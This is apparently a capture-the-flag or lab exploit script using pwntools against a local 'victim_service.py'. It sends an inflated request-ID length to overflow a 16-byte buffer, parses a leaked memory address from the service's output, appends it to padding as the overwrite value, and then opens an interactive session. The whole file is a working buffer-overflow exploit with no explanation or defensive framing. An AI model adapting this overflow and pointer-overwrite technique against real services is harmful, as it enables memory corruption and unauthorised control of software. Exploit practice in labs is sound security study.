from pwn import *
import re

context.log_level = 'debug'
p = process(["python3", "victim_service.py"])
# Step 1: send operation choice (0 or 1)
p.sendlineafter(b"Enter operation", b"0")

# Step 2: send req_id_len (your crafted length to trigger overflow)
payload_len = 24    # for example, beyond 16-byte buffer
p.sendlineafter(b"Enter req_id_len", str(payload_len).encode())

# Step 3: build the overflowing payload for req_id

p.recvuntil(b"input address:")
line = p.recvline().decode()
m = re.search(r"0x[0-9a-fA-F]+", line)

input_addr = 0
if m:
    input_addr = int(m.group(0), 16)
    print("Parsed input address:", hex(input_addr))

payload = b"A" * 16 + p64(input_addr)
print(payload)

p.sendline(payload)
p.interactive()